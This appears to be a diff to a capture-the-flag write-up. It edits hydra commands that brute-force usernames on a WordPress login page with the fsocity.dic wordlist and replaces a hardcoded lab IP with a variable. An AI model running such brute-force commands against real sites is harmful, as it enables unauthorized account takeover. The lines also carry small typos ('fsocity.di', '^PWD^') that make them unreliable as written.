@@ -25,7 +25,7 @@ Username
 ```bash
 IP_ADDR=
 hydra -L fsocity.dic -p example $IP_ADDR http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30
-hydra -L fsocity.di -p example $IP_ADDR http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.192.106%2Fwp-admin%2F&testcookie=1:Invalid Username" -t 30
+hydra -L fsocity.di -p example $IP_ADDR http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F$IP_ADDR%2Fwp-admin%2F&testcookie=1:Invalid Username" -t 30
 ```
 Password
 ```bash
